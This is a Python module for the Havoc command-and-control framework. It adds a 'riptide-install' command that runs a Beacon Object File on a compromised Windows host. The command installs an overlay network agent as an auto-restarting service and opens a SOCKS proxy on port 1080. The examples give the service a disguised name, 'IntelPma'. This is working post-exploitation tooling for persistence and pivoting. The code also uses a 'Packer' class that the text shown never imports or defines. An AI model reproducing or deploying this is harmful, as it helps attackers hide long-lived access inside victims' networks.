"""Riptide BOF — install userspace overlay agent as a Windows service.

BOF is the installer only. After sc start it returns.
Requires admin/SYSTEM. Default dest: %ProgramFiles%\\Riptide\\
Service runs as NetworkService (userspace WG, no WinTUN).
"""
from havoc import Demon, RegisterCommand

try:
    from havoc import RegisterModule
except ImportError:
    def RegisterModule(*_a, **_k):
        return None

import os


def _kit_dir():
    env = os.environ.get("RIPTIDE_BOF")
    cands = []
    if env:
        cands.append(env)
    try:
        cands.append(os.path.dirname(os.path.abspath(__file__)))
    except (NameError, TypeError):
        pass
    cands.append(os.path.expanduser("~/github/maelstrom-mesh/bof"))
    for d in cands:
        if d and os.path.isfile(os.path.join(d, "mesh_install.x64.o")):
            return d
    return os.path.expanduser("~/github/maelstrom-mesh/bof")


def riptide_install(demonID, *param):
    demon = Demon(demonID)
    src = param[0] if len(param) > 0 else ""
    conf = param[1] if len(param) > 1 else ""
    svc = param[2] if len(param) > 2 else "RiptideAgent"
    if not src:
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "riptide-install <src.exe> [peer.conf] [svc_name]\n"
            "upload the agent + conf first, then install (BOF does not fetch)",
        )
        return False
    obj = os.path.join(_kit_dir(), "mesh_install.x64.o")
    if not os.path.isfile(obj):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing %s — make -C bof" % obj)
        return False
    packer = Packer()
    packer.addstr(src)
    packer.addstr(conf)
    packer.addstr(svc)
    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK, "riptide-install %s -> %s" % (src, svc)
    )
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def riptide_help(demonID, *param):
    demon = Demon(demonID)
    demon.ConsoleWrite(
        demon.CONSOLE_INFO,
        "riptide-install <src.exe> [peer.conf] [svc_name]\n"
        "  copies to %ProgramFiles%\\Riptide\\ and CreateService delayed-auto\n"
        "  recovery restart, NetworkService, userspace SOCKS on overlay :1080\n"
        "  example: riptide-install C:\\Users\\Public\\riptide-agent.exe "
        "C:\\Users\\Public\\peer.conf IntelPma\n",
    )
    return True


RegisterModule(
    "riptide",
    "Install Riptide overlay agent as a Windows service (BOF installer)",
    "API Only",
    "[riptide-install src.exe [peer.conf] [svc]]",
    "riptide-install C:\\Users\\Public\\riptide-agent.exe C:\\Users\\Public\\peer.conf",
    "",
)

RegisterCommand(
    riptide_install,
    "",
    "riptide-install",
    "Copy overlay agent + conf, CreateService, StartService",
    0,
    "<src.exe> [peer.conf] [svc_name]",
    r"C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPma",
)
RegisterCommand(riptide_help, "riptide", "help", "Show riptide-install usage", 0, "", "")
